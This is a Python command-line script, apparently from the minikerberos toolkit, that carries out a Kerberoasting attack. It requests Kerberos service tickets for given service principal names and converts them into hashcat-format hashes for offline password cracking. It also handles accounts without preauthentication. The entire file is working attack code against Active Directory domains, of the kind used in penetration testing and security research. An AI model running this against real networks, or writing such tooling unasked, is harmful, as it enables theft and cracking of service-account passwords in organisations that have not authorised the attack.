#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import logging
import asyncio
import traceback
from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import TGSTicket2hashcat


spnroastlogger = logging.getLogger("spnroast")

async def spnroast(connection_url, spn, realm, out_file):
	try:
		try:
			with open(spn, 'r') as f:
				pass
			spns = KerberosSPN.from_file(spn, override_realm=realm)
		except:
			spns = [KerberosSPN.from_spn(spn, override_realm=realm)]		
		
		cu = KerberosClientURL.from_url(connection_url)
		ccred = cu.get_creds()
		target = cu.get_target()
		

		results = []
		for spn in spns:
			try:
				client = AIOKerberosClient(ccred, target)
				if client.usercreds.nopreauth is True:
					await client.get_TGT(override_sname=spn)
					tgshash = TGSTicket2hashcat(client.kerberos_TGT)
				else:
					await client.get_TGT()
					tgs, _, _ = await client.get_TGS(spn)
					tgshash = TGSTicket2hashcat(tgs)
				
				if out_file is None:
					print(tgshash)
				results.append(tgshash)
			except Exception as e:
				spnroastlogger.debug('Failed roasting %s Reason: %s' % (spn, str(e)))

		if out_file is not None:
			with open(out_file, 'w', newline='') as f:
				for result in results:
					f.write(result + '\r\n')
		print(results)
		return results
	except:
		traceback.print_exc()


async def amain():
	import argparse
	
	parser = argparse.ArgumentParser(description='Kerberoast', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+<stype>://<domain>\\<username>@<domaincontroller-ip>')
	parser.add_argument('spn', help='the service principal in format <username>@<FQDN> Example: srv_db@TEST.corp for a TGS ticket to be used for file access on server "fileserver"')
	parser.add_argument('-r', '--realm', help='Realm. Use this if you specify username in "spn" field')
	parser.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	await spnroast(args.kerberos_connection_url, args.spn, args.realm, args.out_file)

def main():
	asyncio.run(amain())
	
if __name__ == '__main__':
	main()